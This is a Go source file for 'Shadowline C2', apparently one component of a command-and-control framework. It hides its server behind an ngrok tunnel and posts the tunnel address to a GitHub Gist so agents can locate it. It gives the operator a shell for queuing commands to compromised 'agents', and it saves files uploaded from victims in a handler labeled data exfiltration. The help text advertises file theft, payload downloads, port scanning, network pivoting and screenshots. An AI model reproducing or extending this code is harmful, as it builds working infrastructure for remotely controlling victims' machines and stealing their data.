package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// --- CONFIG STRUCTURE ---
type Config struct {
	GithubToken  string `json:"github_token"`
	GistID       string `json:"gist_id"`
	GistFilename string `json:"gist_filename"`
	ServerPort   string `json:"server_port"`
}

var AppConfig Config

// --- CONSTANTS ---
const (
	ColorReset  = "\033[0m"
	ColorRed    = "\033[31m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorBlue   = "\033[34m"
	ColorPurple = "\033[35m"
	ColorCyan   = "\033[36m"
)

// Ngrok API Structure
type NgrokTunnels struct {
	Tunnels []struct {
		PublicURL string `json:"public_url"`
	} `json:"tunnels"`
}

func main() {
	// 1. Load Config
	if !loadConfig() {
		fmt.Println("Failed to load config, continuing with defaults...")
	}

	printBanner()
	fmt.Println(ColorYellow + "[*] Starting Automation..." + ColorReset)

	// 2. Start Ngrok
	go startNgrok()
	fmt.Print(ColorBlue + "[*] Starting Ngrok tunnel (waiting 5s)... " + ColorReset)
	time.Sleep(5 * time.Second)
	fmt.Println(ColorGreen + "OK" + ColorReset)

	// 3. Get Public URL
	publicURL := getNgrokURL()
	if publicURL == "" || publicURL == "Error" {
		fmt.Println(ColorRed + "[-] Failed to get Ngrok URL! Is Ngrok installed?" + ColorReset)
	} else {
		fmt.Printf(ColorGreen+"[+] New Tunnel Address: %s\n"+ColorReset, publicURL)

		// 4. Update GitHub Gist
		fmt.Print(ColorBlue + "[*] Updating GitHub Gist... " + ColorReset)
		if updateGist(publicURL) {
			fmt.Println(ColorGreen + "SUCCESS! 🚀" + ColorReset)
		} else {
			fmt.Println(ColorRed + "FAILED! (Check your Token/ID)" + ColorReset)
		}
	}

	fmt.Println("------------------------------------------------")

	// 5. Start Server
	port := "8080"
	if AppConfig.ServerPort != "" {
		port = AppConfig.ServerPort
	}
	go StartHTTPListener(port)

	// 6. Start Shell Loop
	handleShell()
}

// --- CONFIG LOADER ---
func loadConfig() bool {
	configFile, err := os.Open("config.json")
	if err != nil {
		fmt.Println(ColorRed + "[-] WARNING: 'config.json' not found!" + ColorReset)
		return false
	}
	defer configFile.Close()

	decoder := json.NewDecoder(configFile)
	err = decoder.Decode(&AppConfig)
	return err == nil
}

// --- AUTOMATION FUNCTIONS ---
func startNgrok() {
	port := "8080"
	if AppConfig.ServerPort != "" {
		port = AppConfig.ServerPort
	}
	cmd := exec.Command("ngrok", "http", port)
	cmd.Start()
}

func getNgrokURL() string {
	resp, err := http.Get("http://127.0.0.1:4040/api/tunnels")
	if err != nil {
		return "Error"
	}
	defer resp.Body.Close()

	var data NgrokTunnels
	if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {
		return "Error"
	}

	if len(data.Tunnels) > 0 {
		return data.Tunnels[0].PublicURL
	}
	return "Error"
}

func updateGist(newContent string) bool {
	if AppConfig.GithubToken == "" {
		return false
	}
	url := fmt.Sprintf("https://api.github.com/gists/%s", AppConfig.GistID)
	jsonBody := []byte(fmt.Sprintf(`{"files": {"%s": {"content": "%s"}}}`, AppConfig.GistFilename, newContent))

	req, err := http.NewRequest("PATCH", url, bytes.NewBuffer(jsonBody))
	if err != nil {
		return false
	}
	req.Header.Set("Authorization", "token "+AppConfig.GithubToken)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == 200
}

// --- UI FUNCTIONS ---

func handleShell() {
	scanner := bufio.NewScanner(os.Stdin)
	var activeAgentID string

	for {
		if activeAgentID == "" {
			fmt.Print(ColorCyan + "Shadow-Shell > " + ColorReset)
		} else {
			fmt.Printf(ColorRed+"Shadow-Shell [%s] > "+ColorReset, activeAgentID)
		}

		if !scanner.Scan() {
			break
		}
		line := scanner.Text()
		parts := strings.Fields(line)

		if len(parts) == 0 {
			continue
		}

		command := parts[0]
		args := parts[1:]

		switch command {
		case "help":
			printHelp()
		case "agents", "list":
			listAgents()
		case "use":
			if len(args) < 1 {
				fmt.Println("Usage: use <ID>")
			} else {
				AgentsMutex.RLock()
				_, exists := Agents[args[0]]
				AgentsMutex.RUnlock()
				if exists {
					activeAgentID = args[0]
					fmt.Printf(ColorGreen+"[+] Interacting with %s\n"+ColorReset, activeAgentID)
				} else {
					fmt.Println("Agent not found.")
				}
			}
		case "back":
			activeAgentID = ""
		case "exec":
			if activeAgentID == "" {
				fmt.Println("Select agent first.")
			} else {
				queueCommand(activeAgentID, strings.Join(args, " "))
			}
		case "exit":
			exec.Command("taskkill", "/F", "/IM", "ngrok.exe").Run()
			os.Exit(0)
		}
	}
}

func listAgents() {
	AgentsMutex.RLock()
	defer AgentsMutex.RUnlock()

	fmt.Println("\n" + ColorBlue + "--- ACTIVE AGENTS ---" + ColorReset)
	fmt.Printf("%-15s %-15s %-15s %-15s %-10s %s\n", "ID", "IP", "USERNAME", "HOSTNAME", "PLATFORM", "STATUS")
	fmt.Println(strings.Repeat("-", 90))

	for id, agent := range Agents {
		fmt.Printf("%-15s %-15s %-15s %-15s %-10s %s\n", id, agent.IP, agent.Username, agent.Hostname, agent.Platform, agent.Status)
	}
	fmt.Println("")
}

func queueCommand(agentID, cmd string) {
	AgentsMutex.Lock()
	defer AgentsMutex.Unlock()

	if agent, ok := Agents[agentID]; ok {
		agent.CommandQ = append(agent.CommandQ, cmd)
		fmt.Printf(ColorYellow+"[*] Command queued: %s\n"+ColorReset, cmd)
		fmt.Println("[*] Waiting for agent heartbeat...")
	}
}

func printHelp() {
	fmt.Println("\n--- GENERAL COMMANDS ---")
	fmt.Println("agents, list     : List connected agents")
	fmt.Println("use <ID>         : Interact with an agent")
	fmt.Println("back             : Go back to main menu")
	fmt.Println("exit             : Exit C2")

	fmt.Println("\n--- AGENT COMMANDS ---")
	fmt.Println("exec <cmd>       : Run shell command")
	fmt.Println("exec sysinfo          : Get system details")
	fmt.Println("exec download <url> <path> : Download file FROM internet TO victim")
	fmt.Println("exec upload <path>    : Steal file FROM victim TO C2 server")
	fmt.Println("exec cd <path>        : Change directory")
	fmt.Println("exec scan <ip>        : Scan a single IP for open ports")
	fmt.Println("exec scan sweep <sub> : Ping sweep a subnet (e.g. 192.168.1)")
	fmt.Println("exec pivot socks <p>  : Start a pure-Go SOCKS5 proxy on agent's port <p>")
	fmt.Println("exec pivot fwd <p> <t>: Forward agent port <p> to target <t> (e.g. 10.0.0.5:80)")
	fmt.Println("screenshot       : Take a screenshot and upload to C2")
	fmt.Println("kill             : Kill the agent")
	fmt.Println("")
}

func printBanner() {
	banner := `
  █████████  █████                    █████                          █████        ███                     
 ███░░░░░███░░███                    ░░███                          ░░███        ░░░                      
░███    ░░░  ░███████    ██████    ███████   ██████  █████ ███ █████ ░███        ████  ████████    ██████ 
░░█████████  ░███░░███  ░░░░░███  ███░░███  ███░░███░░███ ░███░░███  ░███       ░░███ ░░███░░███  ███░░███
 ░░░░░░░░███ ░███ ░███   ███████ ░███ ░███ ░███ ░███ ░███ ░███ ░███  ░███        ░███  ░███ ░███ ░███████ 
 ███    ░███ ░███ ░███  ███░░███ ░███ ░███ ░███ ░███ ░░███████████   ░███      █ ░███  ░███ ░███ ░███░░░  
░░█████████  ████ █████░░████████░░████████░░██████   ░░████░████    ███████████ █████ ████ █████░░██████ 
 ░░░░░░░░░  ░░░░ ░░░░░  ░░░░░░░░  ░░░░░░░░  ░░░░░░     ░░░░ ░░░░    ░░░░░░░░░░░ ░░░░░ ░░░░ ░░░░░  ░░░░░░  
                                                                                                           
   SHADOWLINE C2 - AUTOMATION EDITION
`
	fmt.Println(ColorPurple + banner + ColorReset)
}

// --- FILE UPLOAD HANDLER (DATA EXFILTRATION) ---

func handleFileUpload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}

	// 1. Parse Multipart Form (Max 50MB)
	r.ParseMultipartForm(50 << 20)

	// 2. Get the file from the request
	file, header, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "Error retrieving file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	// 3. Create 'uploads' directory if not exists
	uploadDir := "uploads"
	if _, err := os.Stat(uploadDir); os.IsNotExist(err) {
		os.Mkdir(uploadDir, 0755)
	}

	// 4. Save the file (uploads/timestamp_filename)
	filename := fmt.Sprintf("%d_%s", time.Now().Unix(), header.Filename)
	dstPath := filepath.Join(uploadDir, filename)

	dst, err := os.Create(dstPath)
	if err != nil {
		http.Error(w, "Error saving file", http.StatusInternalServerError)
		return
	}
	defer dst.Close()

	// 5. Copy content
	if _, err := io.Copy(dst, file); err != nil {
		http.Error(w, "Error copying file", http.StatusInternalServerError)
		return
	}

	fmt.Printf("\n%s[+] FILE CAPTURED: %s%s\nShadow-Shell > ", ColorGreen, dstPath, ColorReset)

	w.WriteHeader(http.StatusOK)
}
